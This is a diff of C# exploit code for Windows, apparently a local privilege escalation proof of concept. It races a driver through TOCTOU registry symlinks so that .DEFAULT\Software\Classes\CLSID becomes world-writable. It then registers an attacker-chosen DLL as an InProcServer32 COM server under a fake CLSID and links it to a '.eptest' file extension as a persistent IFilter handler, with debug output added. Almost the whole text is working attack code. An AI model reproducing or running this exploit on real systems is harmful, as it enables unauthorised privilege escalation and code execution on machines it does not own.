@@ -280,33 +280,50 @@ if($r-eq 0){
             NtClose(hTK);
         }
 
-        /* IFilter registration in .DEFAULT\Software\Classes via two more TOCTOU runs */
-        const string EP_GUID = "{EEB02C9D-1234-5678-ABCD-EF0123456789}";
-        const string EP_EXT  = ".eptest";
-        string clsidKey  = string.Join("\\", _reg, "Software","Classes","CLSID",EP_GUID);
-        string inprocKey = clsidKey + "\\InProcServer32";
-        string extKey    = string.Join("\\", _reg, "Software","Classes",EP_EXT);
-        string phKey     = extKey + "\\PersistentHandler";
+        /* IFilter registration in .DEFAULT\Software\Classes via TOCTOU runs */
+        const string EP_GUID   = "{EEB02C9D-1234-5678-ABCD-EF0123456789}";
+        const string EP_EXT    = ".eptest";
+        string clsidParent = string.Join("\\", _reg, "Software","Classes","CLSID");
+        string clsidKey    = clsidParent + "\\" + EP_GUID;
+        string inprocKey   = clsidKey + "\\InProcServer32";
+        string extKey      = string.Join("\\", _reg, "Software","Classes",EP_EXT);
+        string phKey       = extKey + "\\PersistentHandler";
 
-        /* TOCTOU 3: create .DEFAULT\Software\Classes\CLSID\{EP_GUID} world-writable */
+        /* TOCTOU 3: make .DEFAULT\Software\Classes\CLSID world-writable.
+           If it doesn't exist the driver creates it fresh with anonymous DACL.
+           Either way we get KEY_ALL_ACCESS on it. */
         RecDelete(BA); Thread.Sleep(300);
-        CreateSymlinkPS(BA, clsidKey);
+        CreateSymlinkPS(BA, clsidParent);
         Console.Write("    TOCTOU(CLSID): "); RunToctou();
 
-        /* Create InProcServer32 subkey and register our DLL */
+        /* With CLSID now world-writable, create {EP_GUID}\InProcServer32 ourselves */
         {
-            var oa = new OA(inprocKey, OBJ_CASE_INSENSITIVE);
-            IntPtr hK; uint disp;
-            int r = NtCreateKey(out hK, KEY_ALL_ACCESS, ref oa, 0, IntPtr.Zero, 0, out disp);
-            oa.Free();
-            if (r==0 && hK!=IntPtr.Zero) {
-                var vn=new US(""); var wb=System.Text.Encoding.Unicode.GetBytes(dllPath+"\0");
-                NtSetValueKey(hK,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
-                var tm=new US("ThreadingModel"); var tb=System.Text.Encoding.Unicode.GetBytes("Both\0");
-                NtSetValueKey(hK,ref tm,0,REG_SZ,tb,tb.Length); tm.Free();
-                NtClose(hK);
-                Console.WriteLine($"[+] InProcServer32 registered (0x{r:X})");
-            } else Console.WriteLine($"[-] InProcServer32 create failed: 0x{r:X8}");
+            IntPtr hClsid = OKey(clsidParent, KEY_ALL_ACCESS);
+            Console.WriteLine($"[dbg] CLSID open: {(hClsid==IntPtr.Zero?"FAIL":"OK")}");
+            if (hClsid != IntPtr.Zero) {
+                IntPtr hGuid; uint disp;
+                var oa = new OA(clsidKey, OBJ_CASE_INSENSITIVE);
+                int r = NtCreateKey(out hGuid, KEY_ALL_ACCESS, ref oa, 0, IntPtr.Zero, 0, out disp);
+                oa.Free();
+                Console.WriteLine($"[dbg] GUID key: 0x{r:X8}");
+                if (r==0 && hGuid!=IntPtr.Zero) {
+                    IntPtr hInproc; uint disp2;
+                    var oa2 = new OA(inprocKey, OBJ_CASE_INSENSITIVE);
+                    int r2 = NtCreateKey(out hInproc, KEY_ALL_ACCESS, ref oa2, 0, IntPtr.Zero, 0, out disp2);
+                    oa2.Free();
+                    Console.WriteLine($"[dbg] InProcServer32: 0x{r2:X8}");
+                    if (r2==0 && hInproc!=IntPtr.Zero) {
+                        var vn=new US(""); var wb=System.Text.Encoding.Unicode.GetBytes(dllPath+"\0");
+                        NtSetValueKey(hInproc,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
+                        var tm=new US("ThreadingModel"); var tb=System.Text.Encoding.Unicode.GetBytes("Both\0");
+                        NtSetValueKey(hInproc,ref tm,0,REG_SZ,tb,tb.Length); tm.Free();
+                        NtClose(hInproc);
+                        Console.WriteLine($"[+] InProcServer32 = {dllPath}");
+                    }
+                    NtClose(hGuid);
+                }
+                NtClose(hClsid);
+            }
         }
 
         /* TOCTOU 4: create .DEFAULT\Software\Classes\.eptest world-writable */
